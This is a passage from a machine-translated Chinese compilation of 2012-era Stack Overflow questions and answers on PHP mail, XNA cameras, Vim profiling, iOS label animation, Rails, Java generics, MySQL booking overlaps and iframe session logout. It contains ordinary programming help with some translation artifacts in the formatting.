        'Reply-To: ' . $email . "\r\n" .
        'X-Mailer: PHP/' . phpversion();

    mail($to, $subject, $message, $headers);
}
?> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T10:38:28.530

您需要检查发送的电子邮件

```
if ($_POST) {
    $email=$_POST['email'];
    $subject=$_POST['subject'];
    $budget=$_POST['budget'];
    $text=$_POST['text'];
    $to="hello@mymail.com";

    if(mail($to, "Piece of Cake = ".$subject, $text, "Budget:".$budget, "From:".$email )) echo '1';
    else echo '0';

} 
```

在 ajax 响应中检查电子邮件发送的响应

```
$(function (){
    $('button#send_brief').click(function(){
        var email = $('#brief_email');
        var subject = $('#brief_type');
        var budget = $('#brief_budget');
        var text = $('#brief_comments');
        var emailerData = 'email' + email +'&subject' + subject + '&budget' + budget+ '&text' + text;

        if(text=='') {
            $('#brief_email').css({'background-color':'red'});
         }
         else {

        $.ajax({
            type: "POST",
            url:"emailer.php",
            data: emailerData,
            success: function(result){
            if(result == 1){
    $('.success').fadeIn(1000);
                setTimeout (function(){
                $('.brief').slideUp({
                    duration: 1000,
                    easing: 'easeInSine'});}
                            ,2000);
                setTimeout (function(){
                $('#brief').fadeIn();}
                            ,3000);
                setTimeout (function(){
                $('.success').fadeOut(1000);}
                            ,2000);
}
            }

        });

        return false;}
    });   

}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T10:40:50.993

您的电子邮件发送代码有两个问题：

```
mail($to, "Piece of Cake = ".$subject, $text, "Budget:".$budget, "From:".$email ); 
```

第一个问题是您没有检查返回值：

```
if (false === mail( ... )) { echo "Yelp! Mail not sent"; } 
```

第二个问题是您的电子邮件标题应该组合到第四个参数中：

```
mail($to, "Piece of Cake = ".$subject, $text, "Budget: $budget\r\nFrom: $email"); 
```

*这是因为第五个参数用于`sendmail`，它不是电子邮件标题的另一个字段。*

# 3d - 将相机与矩形对齐

> ID：12213590
> 
> 赞同：3
> 
> 时间：2012-08-31T10:33:13.507
> 
> 标签：3d, xna, camera, projection-matrix

我们正在尝试对齐我们的相机，以便看到尽可能接近的矩形（平行六面体的面，因为我们在 3D 中）。此处考虑的视口的纵横比与要对齐的矩形不匹配。

# 我们所做的：

在我们的场景中就是这个矩形。摄像头位于其前方。下面是摄像头的配置：

```
projection = Matrix.CreatePerspectiveFieldOfView(
    Fov, AspectRatio, NearPlane, FarPlane
);

view = Matrix.CreateLookAt(Position, Target, this.Up); 
```

`float Fov = PI/4;`

`float AspectRatio = device.Viewport.AspectRatio;`

`Vector3 Target`设置为矩形的中心。

`Vector3 Position`是我们正在寻找的价值。

然后初始化相机： oat width = (float)GraphicsDevice.Viewport.Width; 浮动高度 = (float)GraphicsDevice.Viewport.Height;

```
float dist = (width / 2) + (height / 2);

float alpha = 0;
float beta = 0;
float gamma = 0;

alpha = (float)Math.Sqrt(Math.Pow(width / 2, 2) + Math.Pow(height / 2, 2));
beta = height / ((float)Math.Cos(MathHelper.ToRadians(70.3f)) * 2);
gamma = (float)Math.Sqrt(beta * beta - alpha * alpha);

position = new Vector3(width / 2, -height / 2, gamma);
target = new Vector3(width / 2, -height / 2, dist / 2);

camera = new Camera(GraphicsDevice.Viewport)
{
    Position = position,
    Target = target,
    Near = 1f,
    Far = 10000f
}; 
```

（[VS 解决方案](http://www.uploadmb.com/dw.php?id=1346650520)）

更精确：为了创建视图，我们使用`Matrix.CreateLookAt`和 进行投影`Matrix.CreatePerspectiveFieldOfView`。我们也不确定这些是否是完美的选择，但听起来很像。

# 我们得到什么：

在一些基本的三角函数之后，我们得到了一个在高度 > 宽度时工作的相机位置。作为： ![在此处输入图像描述](../Images/f81f3dd9793cde83ff183618816991e4.png) ![在此处输入图像描述](../Images/5f707fdc827aab9dd1763606a7c6a485.png)

但是当宽度>高度时它不会： ![在此处输入图像描述](../Images/3aedabf491da884ab75e34e7931a1a79.png)

## 你...

...知道我们做错了什么吗？您有其他或更好的方法来实现这一目标吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-03T07:50:31.740

找到金字塔的高度是行不通的。只需使用 Tan，因为`Fov = PI/4`代码应如下所示：

```
float tanGamma = (height / 2) * ((float)Math.Tan(MathHelper.ToRadians(67.5f))); 
```

# django - Heroku + Django + Sendgrid 不会产生错误，但不会发送电子邮件

> ID：12213593
> 
> 赞同：1
> 
> 时间：2012-08-31T10:33:29.077
> 
> 标签：django, heroku, sendgrid

我正在使用 sendgrid 作为 smtp 服务器并发送密码重置电子邮件，但是没有错误消息就无法发送电子邮件。

settings.py 中的当前 smtp 设置如下：

```
EMAIL_HOST = 'smtp.sendgrid.net'
EMAIL_PORT = 587
EMAIL_HOST_USER = 'appname@heroku.com'
EMAIL_HOST_PASSWORD = 'my password'
EMAIL_USE_TLS = True 
```

sendgrid 主页的屏幕截图也表明电子邮件已送达，但我无法在任何地址收到它们。

是不是因为我没有设置 DEFAULT_FROM_EMAIL 之类的？提前感谢您的帮助！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T15:54:35.043

如果我们的仪表板显示电子邮件已送达，则表示邮件服务器已收到邮件。但是，可能存在阻止邮件服务器和邮件客户端之间传递的问题。在这种情况下，您需要与邮件服务器的邮件管理员进行调查。

您是否尝试过发送到多个 ISP？您是否在多个 ISP 上获得相同的结果？

我们还可以通过实时聊天、电子邮件和电话获得支持，网址为[http://support.sendgrid.com](http://support.sendgrid.com)

*免责声明：我为 SendGrid 工作。*

# debugging - 如何查看哪些插件使 Vim 变慢？

> ID：12213597
> 
> 赞同：355
> 
> 时间：2012-08-31T10:33:53.057
> 
> 标签：debugging, optimization, vim, macvim

有没有办法分析 Vim 插件？

当我打开一个大的`.py`. 我知道我可以取消选择所有插件并一一重新选择以检查哪个插件是罪魁祸首，但是有更快的方法吗？

我的 dotvim 在这里：[https ://github.com/charlax/dotvim](https://github.com/charlax/dotvim)

* * *

## 回答 #1

> 赞同：563
> 
> 时间：2012-08-31T13:41:27.643

您可以使用内置的分析支持：启动 vim 后

```
:profile start profile.log
:profile func *
:profile file *
" At this point do slow actions
:profile pause
:noautocmd qall! 
```

（不像`noautocmd`真正需要退出，它只是让 vim 退出更快）。

注意：你不会得到关于在 vim 退出之前删除的函数的信息。

* * *

## 回答 #2

> 赞同：86
> 
> 时间：2013-12-03T08:37:31.383

我发现了另一种非常有用的 vim 内置方法，可以在加载 .vimrc 时显示准确的时间消息。

```
vim --startuptime timeCost.txt timeCost.txt 
```

请运行：

```
:help --startuptime 
```

在 VIM 中获取更多信息。

* * *

## 回答 #3

> 赞同：31
> 
> 时间：2012-08-31T12:04:09.770

它可以是插件或语法高亮；当这种情况发生时尝试一下`:syntax off`，看看 Vim 是否立即变得更快。

对于插件，“一般缓慢”通常来自自动命令；a`:autocmd`将它们全部列出。通过杀死其中一些进行调查`:autocmd! [group] {event}`。从更频繁的事件（即`CursorMoved[I]`）到不太频繁的事件（例如`BufWinEnter`）。

如果您可以在某种程度上可靠地重现缓慢，则二进制搜索可能会有所帮助：移开 中的一半文件`~/.vim/plugin/`，然后在另一组中重复缓慢的文件。

如果您真的需要深入了解，请获取`:profile`启用了该命令的 Vim 版本。（不是普通的 BIG Windows 版本，而是 Cygwin 附带的版本；此外，在大多数发行版下，自编译非常容易。）

* * *

## 回答 #4

> 赞同：17
> 
> 时间：2012-08-31T11:00:58.257

`-V`我发现通过使用以下选项启动 Vim 将所有 Vim 活动打印到文件很有帮助：

```
vim -V12log 
```

这提供了最大的详细程度（级别 12）并将其输出到文件`log`. 然后您可以执行一些您知道很慢的 Vim 操作，然后查看内部调用了哪些函数/映射。

* * *

## 回答 #5

> 赞同：10
> 
> 时间：2018-09-19T19:30:01.753

如果您遇到屏幕更新操作（`^L`、滚动等）缓慢的问题，您的问题可能是语法高亮文件效率低下。您可以通过暂时禁用语法高亮 ( `:syn off`) 并查看问题是否消失来对此进行测试；如果您想深入了解详细信息，可以使用以下方式分析当前语法文件`:syntime`：

1.  打开导致语法突出显示性能问题的文件。
2.  运行`:syntime on`以开始分析。
3.  稍微滚动一下文件。
4.  运行`:syntime report`以生成报告。报告中首先列出的模式是处理时间最长的模式。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2020-07-12T17:08:02.160

一个非常简单的解决方案：找到一个慢速命令。将一个插件移至`/tmp/`. 再次尝试该命令。如果仍然很慢，请将另一个插件移至`/tmp/`. 重复，直到找到使命令变慢的插件。

# ios - 在 UILabel 中使用动画

> ID：12213598
> 
> 赞同：10
> 
> 时间：2012-08-31T10:33:58.780
> 
> 标签：ios

我有一个包含 4 个值的数组，这些值将以 2 个不同的`UILabel`. 我将成对分组这些值。在特定的一秒内，标签以递归方式与另一对项目更改值。

如果可能的话，我想给一个动画像淡出或左右滑动效果。

我已经看过一些内容，但对我没有任何意义。例如，这是一个工作动画（根据接受的答案）：

```
[UIView animateWithDuration:1.0 delay:0.f options:(UIViewAnimationOptionAutoreverse| UIViewAnimationOptionRepeat)
   animations:^{
   playerScore.alpha=1.f;
   } completion:^(BOOL finished){
   playerScore.alpha=0.f;
   }]; 
```

我不确定将这段代码放在哪里，放在单独的方法中还是放在`viewDidLoad`. 任何人都可以提供线索和信息吗？那会很好。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-08-31T13:05:49.990

我不清楚为什么需要这么多`UILabel`，因为您可以在更改当前文本时**添加过渡动画**`UILabel`。

```
UILabel *textLabel = // ... whatever

[textLabel setText:@"Initial text what I just write accidentally"];

CATransition *transitionAnimation = [CATransition animation];
[transitionAnimation setType:kCATransitionFade];
[transitionAnimation setDuration:0.3f];
[transitionAnimation setTimingFunction:[CAMediaTimingFunction functionWithName:kCAMediaTimingFunctionEaseInEaseOut]];
[transitionAnimation setFillMode:kCAFillModeBoth];
[textLabel.layer addAnimation:transitionAnimation forKey:@"fadeAnimation"];

[textLabel setText:@"New text will show after a nice fade effect"]; 
```

这是一个非常优雅和简单的解决方案。

* * *

## 更新（2016 年 1 月 6 日）

*注意：动画将在完成（或取消、失败或其他）后自动删除，您需要注意为每个会话重新生成动画或通过将* `removedOnCompletion` *属性设置为* `FALSE` *或* `NO`显式保持当前动画处于活动状态。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-01-06T17:48:18.927

@holex 的 Swift 版本回答：

```
textLabel.text = "originalValue"

let textAnimation = CATransition()
textAnimation.type = kCATransitionFade
textAnimation.duration = 0.4

textLabel.layer.addAnimation(textAnimation, forKey: nil)
textLabel.text = "newValue" 
```

如果您想要动画完成时的回调，请使用以下命令：

```
CATransaction.begin()
CATransaction.setCompletionBlock({
     print("Text Animation Complete!")
})

let textAnimation = CATransition()
textAnimation.type = kCATransitionFade
textAnimation.duration = 0.4

textLabel.layer.addAnimation(textAnimation, forKey: nil)
textLabel.text = "newValue"

CATransaction.commit() 
```

# ruby-on-rails - 将数组发送到每个模板

> ID：12213601
> 
> 赞同：0
> 
> 时间：2012-08-31T10:34:05.920
> 
> 标签：ruby-on-rails, erb

我已经构建了一个简单的内容管理系统，并且正在尝试构建一个动态导航栏，但我想出的方法是不断地将所有页面的数组从每个控制器发送到应用程序模板。有更好的方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T11:08:45.127

正如@Amit Patel 在对您的问题的评论中提到的那样，更好的方法是将您所指的代码移动到`ApplicationController`.

应用程序中的所有控制器都扩展了`ApplicationController`该类。您想在所有控制器之间共享的任何功能都可以放在此类中。

作为示例*（因为您没有提供实际代码）*，您可以将其设置为`before_filter`

```
class ApplicationController < ActionController::Base
  before_filter :build_pages_array

  # Your other ApplicationController code here...

    private

    def build_pages_array
      @pages = Page.all
    end
end 
```

before_filter 将为所有控制器中的所有操作运行，有效地使`@pages`应用程序中的每个模板都可用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T11:08:35.040

您可以在`ApplicationHelper`( `app/helper/application_helper.rb`) 模块中创建一个方法，您将从视图中访问此方法：

```
module ApplicationHelper
  def get_your_array
    # create your array here
  end
end 
```

在您看来：

```
<% get_your_array.each |item| -%>
  <%= item %>
<% end -%> 
```

# java - Java 编译器忽略类型安全

> ID：12213604
> 
> 赞同：7
> 
> 时间：2012-08-31T10:34:16.830
> 
> 标签：java, oop, generics, types, type-safety

```
public class POJO<T> {

    private List<Integer> integer = new ArrayList<Integer>();

    public POJO() {
        integer.add(1);
        integer.add(2);
    }

    public List<Integer> getInteger() {
        return integer;
    }

    public static void main(String[] args) {
        POJO pojo = new POJO();
        List<String> integer = pojo.getInteger(); // No compile error?
        System.out.println(integer); // prints [1, 2]
    }
} 
```

以下行如何编译：

```
List<String> integer = pojo.getInteger(); 
```

提供`getInteger()`的类型如下

```
public List<Integer> getInteger() 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-31T11:16:23.747

I found a reference in the [JLS 4.8](http://docs.oracle.com/javase/specs/jls/se7/html/jls-4.html#jls-4.8-210) that backs up what @PeterLawrey says:

> The type of a constructor (§8.8), instance method (§8.4, §9.4), or non-static field (§8.3) M of a raw type C that is not inherited from its superclasses or superinterfaces is the raw type that corresponds to the erasure of its type in the generic declaration corresponding to C.

So all instance methods of your raw `POJO` object are erased, including those that don't reference the type `T` of `POJO<T>`, which means ([JLS 4.6](http://docs.oracle.com/javase/specs/jls/se7/html/jls-4.html#jls-4.6-210)):

> The type parameters of a [...] method (§8.4.4), and the return type (§8.4.5) of a method, also undergo erasure if the [...] method's signature is erased.

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-08-31T10:51:43.433

As`pojo`未声明为泛型

```
POJO pojo = new POJO(); 
```

编译器假定您在预通用代码中使用它。即在编写代码后添加泛型。所以当你这样做时

```
List<String> integer = pojo.getInteger(); 
```

您会收到警告而不是错误。

即，如果类型是非泛型的，则所有泛型检查都将关闭，而不仅仅是那些与您没有提供的类型相关的检查。我相信这是为了最大程度的向后兼容性。

为了比较。

```
Map mapOfInteger = new Map(); // no generics
Set<String> entries = map.entrySet(); // gives a warning, not an error. 
```

在这个例子中，如果不是泛型，您可能希望`Set<Entry<K, V>>`成为`Set<Entry>`非泛型，但编译器会退回到将类视为非泛型`Set`。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-31T10:57:57.203

这是一个未经检查的分配，出于兼容性原因不被视为错误。

请参阅[与旧代码互操作](http://docs.oracle.com/javase/tutorial/extra/generics/legacy.html)

> 实际上，分配是合法的，但它会产生未经检查的警告。

# php - 如何让 PHP 通过 Apache 指令处理不存在的文件请求？

> ID：12213606
> 
> 赞同：0
> 
> 时间：2012-08-31T10:34:27.920
> 
> 标签：php, apache, httpd.conf, php-extension, apache-config

我正在尝试编写一个 PHP 扩展来执行特定请求的一些操作。

问题是，即使为 PHP 运行正确设置了处理程序，除非请求 URL 映射到现有文件，否则它只会显示“未找到”错误页面，跳过扩展代码。

尽管这听起来像是对 PHP 的虚假使用，但我真的希望 PHP 能够运行，无论服务器中是否存在 PHP 脚本。

是否有一个指令可以用来抑制给定正则表达式匹配的“未找到”错误页面，而不使用重定向？如果没有，我如何使用重定向来实现这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T10:36:44.770

也许您可以为此使用[ErrorDocument](https://httpd.apache.org/docs/2.2/mod/core.html#errordocument)指令。
但是你必须处理所有的 404 条件。最初请求的路径位于 $_SERVER 数组中的某个位置。因此，您可以在 php 脚本“内”使用您的正则表达式。

编辑：原始路径存储在`$_SERVER['REQUEST_URI']`.
并且 php 脚本可以发送任何它想要的 http 状态码，404、301、200 等等；虽然我不知道 apache 2.4 中的新级联定义会发生什么...

# linux - 带颜色的 Linux IO 重定向

> ID：12213608
> 
> 赞同：1
> 
> 时间：2012-08-31T10:34:36.147
> 
> 标签：linux, bash

Linux 中有一些命令可以选择保留颜色而不管 IO 重定向如何，例如：

```
| grep --color=always 
```

有没有办法为任何自定义程序保留输出重定向的颜色？

在我的特定示例中，我使用带有颜色输出的 cmake，它被重定向到 sed 以突出显示警告和错误（使用[http://shawnwilsher.com/2008/12/highlight-warnings-in-make/](http://shawnwilsher.com/2008/12/highlight-warnings-in-make/)）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T11:16:04.237

Programs decide to turn coloring sequences off by checking if file descriptor 1 points to /dev/stdout. If there is no option to override that check, you have to 'be the terminal' for the program.

I found [InterceptTTY](http://www.suspectclass.com/sgifford/interceptty/) which is supposed to do exactly that, although i have no experience with it.

# c# - DataBinding 不包含属性

> ID：12213611
> 
> 赞同：0
> 
> 时间：2012-08-31T10:34:47.657
> 
> 标签：c#, data-binding

请帮忙，因为我是 C# 的新手

我面临以下错误

“DataBinding：‘Sherserve.CustomTypeLayer.EmployeeLeave’不包含名为‘empId’的属性”

这是我的代码：

```
protected void Button1_Click(object sender, EventArgs e)
{
    LMSManager leavestatus = new LMSManager();
    int emplid = Convert.ToInt32(Session["EmployeeID"]);
    List<EmployeeLeave> leaverecord = leavestatus.GetLeaveRecord(emplid);

    GridView1.DataSource = leaverecord;
    GridView1.DataBind();
} 
```

这是 EmployeeLeave ：

```
public class EmployeeLeave
{
    public LeaveReason LeaveType { get; set; }
    public int EmployeeId { get; set; }
    public DateTime DateFrom { get; set; }
    public DateTime DateTo { get; set; }
    public string Reason { get; set; }
} 
```

这是 aspx ：

```
<asp:GridView ID="GridView1" runat="server" AutoGenerateColumns="False" AllowPaging="True"
  PageSize="3" OnPageIndexChanging="GridView1_PageIndexchanging" CellPadding="4"
  ForeColor="#333333" Height="16px" 
  Style="margin-bottom: 0px; margin-right: 0px;">
  <%-- DataSourceID="SqlDataSource1"--%>
    <AlternatingRowStyle BackColor="White" />
    <FooterStyle BackColor="#990000" Font-Bold="True" ForeColor="White" />
    <HeaderStyle BackColor="#990000" Font-Bold="True" ForeColor="White" />
    <PagerStyle BackColor="#FFCC66" ForeColor="#333333" HorizontalAlign="Center" />
    <RowStyle BackColor="#FFFBD6" ForeColor="#333333" />
    <SelectedRowStyle BackColor="#FFCC66" Font-Bold="True" ForeColor="Navy" />
    <SortedAscendingCellStyle BackColor="#FDF5AC" />
    <SortedAscendingHeaderStyle BackColor="#4D0000" />
    <SortedDescendingCellStyle BackColor="#FCF6C0" />
    <SortedDescendingHeaderStyle BackColor="#820000" />

    <Columns>
        <asp:TemplateField>
            <ItemTemplate>
                <asp:Label ID="lblEmpId" runat="server" Text='<%#Eval("empId")%>'/>
            </ItemTemplate>
        </asp:TemplateField>
        <asp:TemplateField>
            <ItemTemplate>
                <asp:Label ID="lblLeaveType" runat="server" Text='<%#Eval("LeaveType") %>'/>
            </ItemTemplate>
        </asp:TemplateField>
        <asp:TemplateField>
            <ItemTemplate>
                <asp:Label ID="lblempid" runat="server" Text='<%#Eval("EmployeeId") %>'/>
            </ItemTemplate>
        </asp:TemplateField>
        <asp:TemplateField>
            <ItemTemplate>
                <asp:Label ID="lblDateFrm" runat="server" Text='<%#Eval("DateFrom") %>'/>
            </ItemTemplate>
        </asp:TemplateField>
        <asp:TemplateField>
            <ItemTemplate>
                <asp:Label ID="lblDateTo" runat="server" Text='<%#Eval("DateTo") %>'/>
            </ItemTemplate>
        </asp:TemplateField>
        <asp:TemplateField>
            <ItemTemplate>
                <asp:Label ID="lblRsn" runat="server" Text='<%#Eval("Reason") %>'/>
            </ItemTemplate>
        </asp:TemplateField>
    </Columns>
</asp:GridView> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T10:41:19.863

看起来您的数据绑定指的是实际调用`empId`的字段。`EmployeeLeave``EmployeeId`

尝试改变

```
<ItemTemplate>
    <asp:Label ID="lblEmpId" runat="server" Text='<%#Eval("empId")%>'></asp:Label>
</ItemTemplate> 
```

至

```
<ItemTemplate>
    <asp:Label ID="lblEmpId" runat="server" Text='<%#Eval("EmployeeId")%>'></asp:Label>
</ItemTemplate> 
```

# ruby-on-rails - 如何从 Rails 写入临时文件

> ID：12213623
> 
> 赞同：0
> 
> 时间：2012-08-31T10:35:28.683
> 
> 标签：ruby-on-rails

如何从我正在使用的 Rails 应用程序写入临时文件（在机器的临时文件夹中）`Spreadsheet::Workbook.new`并且我希望将内容写入临时文件

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T10:56:56.270

您可以使用 Ruby 的[`Tempfile`](http://www.ruby-doc.org/stdlib-1.9.3/libdoc/tempfile/rdoc/Tempfile.html)：

```
file = Tempfile.new('prefix') 
```

或使用块：

```
Tempfile.new('prefix') do |file|
  # do the work with the file
end 
```

# coding-style - 如何在 IntelliJ IDEA 11 中禁用 getter/setter 的 JavaDoc 代码检查？

> ID：12213624
> 
> 赞同：2
> 
> 时间：2012-08-31T10:35:30.897
> 
> 标签：coding-style, ide, intellij-idea, javadoc, code-inspection

在我们的项目中，属性（getter/setter）已经非常具有自我描述性，因此我们看不到为这些属性添加 JavaDoc 的原因。

所以我想知道：是否可以仅对 getter/setter 禁用 JavaDoc 检查（代码检查“声明存在 JavaDoc 问题”）并将其留给 IntelliJ IDEA 中的其他方法？我试图找到解决方案，但到目前为止 - 没有运气。

提前致谢

更新：发现这个[问题](http://youtrack.jetbrains.com/issue/IDEA-43830#tab=History)是对 IDEA 的功能建议。看来还是没有解决。我想知道是否有一些自定义代码检查实现可以以某种方式处理它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2019-01-07T17:34:14.967

我正在使用 IntelliJ 2018.1

在*声明中有 Javadoc 问题*检查的选项下，您可以标记显示*忽略简单属性访问器的复选框*

分步指南：

1.  按 CTRL + ALT + S 打开设置
2.  导航到编辑器 > 检查
3.  打开 Javadoc 选项
4.  选择声明有 Javadoc 问题，这会打开侧边菜单
5.  在这个菜单的底部是一个复选框*忽略简单的属性访问器*

# mysql - MySQL 预订可用性，重叠日期范围

> ID：12213630
> 
> 赞同：1
> 
> 时间：2012-08-31T10:35:51.590
> 
> 标签：mysql

我有一张预订表：

*   标识（整数）
*   数量 (tinyint)
*   date_start（时间戳）
*   date_end（时间戳）

预订可以重叠，因此例如可以同时有 20 个预订。现在我想做两个查询：

1) 检索给定时间段内的**最大数量总和。**

2) 检索给定时间段内的**最小数量总和。**

我不知道如何将重叠预订的数量加**在一起**，而不是非重叠预订的数量。任何帮助将不胜感激。

编辑：为了清楚起见，我画了一张图片：http: [//i.imgur.com/8GDLV.png](http://i.imgur.com/8GDLV.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T11:16:42.647

1.  构建在所需时间段内出现的所有预订边界（即开始和结束日期）的列表：

    ```
     SELECT date_start AS boundary
      FROM   bookings
      WHERE  date_start BETWEEN @start AND @end
    UNION
      SELECT date_end
      FROM   bookings
      WHERE  date_end BETWEEN @start AND @end 
    ```

2.  添加到紧接在所需时间段之前出现的边界：

    ```
    -- [ from part 1 above ]
    UNION
      SELECT MAX(boundary)
      FROM (
        SELECT MAX(date_start) AS boundary
        FROM   bookings
        WHERE  date_start <= @start
      UNION ALL
        SELECT MAX(date_end)
        FROM   bookings
        WHERE  date_end <= @end
      ) t 
    ```

3.  在此结果和表之间进行外部连接，保留所有边界，但仅包括一个预订，如果它有助于在边界*之后*`bookings`的同时人数：

     *```
    FROM bookings RIGHT JOIN (
      -- [ from part 2 above ]
    ) t ON date_start <= boundary AND boundary < date_end 
    ```* 
**   将每个边界的人数相加：

    ```
    SELECT IFNULL(SUM(quantity),0) AS simultaneous_people
    -- [ from part 3 above ]
    GROUP BY boundary 
    ```

    *   求最大值和最小值：

    ```
    SELECT MIN(simultaneous_people),
           MAX(simultaneous_people)
    FROM (
      -- [ from part 4 above ]
    ) t 
    ```* 

 *把它们放在一起：

```
SELECT MIN(simultaneous_people),
       MAX(simultaneous_people)
FROM (
  SELECT IFNULL(SUM(quantity),0) AS simultaneous_people
  FROM   bookings RIGHT JOIN (
    SELECT date_start AS boundary
    FROM   bookings
    WHERE  date_start BETWEEN @start AND @end
  UNION
    SELECT date_end
    FROM   bookings
    WHERE  date_end BETWEEN @start AND @end
  UNION
    SELECT MAX(boundary)
    FROM (
      SELECT MAX(date_start) AS boundary
      FROM   bookings
      WHERE  date_start <= @start
    UNION ALL
      SELECT MAX(date_end)
      FROM   bookings
      WHERE  date_end <= @end
    ) t
  ) t ON date_start <= boundary AND boundary < date_end
  GROUP BY boundary
) t 
```

在[sqlfiddle](http://sqlfiddle.com/#!2/ae213/1/1)上查看。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T10:43:09.540

问题中的给定数据结构中没有用于分组的字段。因此，假设您按`ID`.

1）。为了得到最大的利用`MAX`

```
SELECT MAX(TotalQty) FROM
(
    SELECT SUM(Quantity) AS TotalQty FROM Bookings
    WHERE date_End<='<To Date>'
    AND date_Start>='<From Date>'
    GROUP BY id
) SumQty 
```

2）。获得最大最小值`MIN`

```
SELECT MIN(TotalQty) FROM
(
    SELECT SUM(Quantity) AS TotalQty FROM Bookings
    WHERE date_End<='<To Date>'
    AND date_Start>='<From Date>'
    GROUP BY id
) SumQty 
```

# [*看到这个 SQLFiddle*](http://sqlfiddle.com/#!2/1165e/4)*

# mysql - Mysql 从相似但不相关的表中获取数据

> ID：12213632
> 
> 赞同：0
> 
> 时间：2012-08-31T10:35:58.530
> 
> 标签：mysql, stored-procedures, union, fetch

我的数据库中有产品表，如下所示：

```
shop1_products
shop2_products
shop3_products
.....
....
...
shop100_products 
```

我想展示现场尝试过的所有表的产品，`union`但我认为 100 个表不行。

我知道，如果我们通过制作一个包含 shopid 列的产品表来做到这一点，它会变得简单。但是在我的网站逻辑中我不能这样做，因为这种结构会迫使我在其他模块上做双重工作。

我正在考虑使用存储过程来做到这一点，但对于`stored procedure`.

您怎么看，我们如何以有效的方式做到这一点？

如果`stored procedure`最好这样做，请向我提供示例代码或参考链接

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T10:47:49.260

```
do like this put all the table names in a temp table then follow these steps in while loop.
Then create a table results with all the required columns

for each @tablename
insert into results
select product name ,id,category... from @tablename
repeat

Then finally select distinct * from results 
```

- - - - - - - - - - - - - - - - -代码 - - - - - - - - -------------------------------------

```
create table temp(id int auto_increment primary key,tblname varchar(100));

insert into temp(tblname)
VALUES('shop1_products'),('shop2_products'),('shop3_products')...('shop100_products');

select min(id),max(id) into @vmin,@vmax from temp;
select @vmin,@vmax;

create table results(productname varchar(100),id int,category varchar(100)...);

while(@vmin <= @vmax)
Do
select tblname into @tablename from temp;

INSERT INTO results(product name ,id,category...)
select product name ,id,category... from @tablename

SET @vmin=@vmin+1;

END WHILE;

select distinct  * from results; 
```

# java - 使用 jsp/servlet 的 iframe 中的会话注销页面问题

> ID：12213639
> 
> 赞同：0
> 
> 时间：2012-08-31T10:36:22.507
> 
> 标签：java, jquery, jsp, iframe, session-timeout

嗨，我正在使用 jsp/sevlet 在 Web 应用程序中工作，我正面临 iframe 中的会话注销页面问题 ![示例网页](../Images/c3cce7b4ab7b440286fbce383939d4c8.png)

我在我的父页面中使用以下代码来处理我的会话超时

```
<script type="text/javascript">
    idleTime = 0;
    $(document).ready(function () {
        //Increment the idle time 2ounter every minute.
        var idleInterval = setInterval("timerIncrement()", 60000); // 1 minute

        //Zero the idle timer on mouse movement.
        $(this).mousemove(function (e) {
            idleTime = 0;
        });
        $(this).keypress(function (e) {
            idleTime = 0;
        });
    })
    function timerIncrement() {
        idleTime = idleTime + 1;
        if (idleTime == 15) { // 15 minutes
           window.location = "logoutPage.jsp"
        }
    }
</script>​​​​​​​​​​​​​​​​​​​​ 
```

我面临的问题是，如果进程运行超出我的 iframe 页面中的会话时间限制，则父页面是 idel，因此它会自动注销

在其他情况下，如果我在 iframe 页面中使用会话超时代码，那么问题是 ![样本页 2](../Images/5336b92dcae795ad0658a2fdd67fcb20.png)

注销页面进入 iframe 页面

解决这个谜团的任何建议或其他解释？请告诉我

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T11:57:58.007

最后我找到了 iframe 问题的解决方案

自动跳出 iframe

iframe 代表内联框架。Iframe 是一种浮动框架，可以插入网页中的任何位置。

网站管理员对 iframe 的担忧是 iframe 可用于将您网站上的页面包含到外部网站中。

您如何防止您网站上的页面被另一个网站通过 iframe 包含在内？

将以下 javascript 代码放置在您网站上所有页面的顶部将确保如果任何其他网站 iframe 对您网站上的页面进行 iframe，您的页面将脱离 iframe 并仅在用户浏览器中显示您的页面。

```
<script type="text/javascript">
<!--
    if (top.location!= self.location) {
        top.location = self.location.href
                   //or you can use your logout page as
                   //top.location='logout.jsp' here...
    }
//-->
</script> 
```

在整个站点上实现这种 iframe 代码中断的最佳方法是将代码放入外部 javascript 文件中，并将其包含在通用模板文件中。

这对充满这种神秘感的朋友很有用......

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-31T10:45:56.853

如果你觉得没问题，试试这个。

将其放在不同的页面中，并使用 JSP 的标记`iframe`将该页面包含在您的主页中。`include`

然后试试看。

我实际上认为`iframe` *仍然*与父页面不同。

# python - libsvm - 交叉验证精度与标签比率相同

> ID：12213640
> 
> 赞同：5
> 
> 时间：2012-08-31T10:36:24.113
> 
> 标签：python, libsvm, svm

我正在为 libsvm 使用 Python 接口，我注意到的是，在使用网格搜索选择最佳参数`C`和`gamma`参数（RBF 内核）后，当我训练模型并交叉验证它时（5 倍，如果相关），我收到的准确度与我的训练数据集中的标签比率相同。

我有 3947 个样本，其中 2898 个有标签 -1，其余的有标签 1。所以这是样本的 73.4229%。

当我训练模型并交叉验证 5 次时，这就是我得到的 -

```
optimization finished, #iter = 1529
nu = 0.531517 obj = -209.738688,
rho = 0.997250 nSV = 1847, nBSV = 1534
Total nSV = 1847
Cross Validation Accuracy = 73.4229% 
```

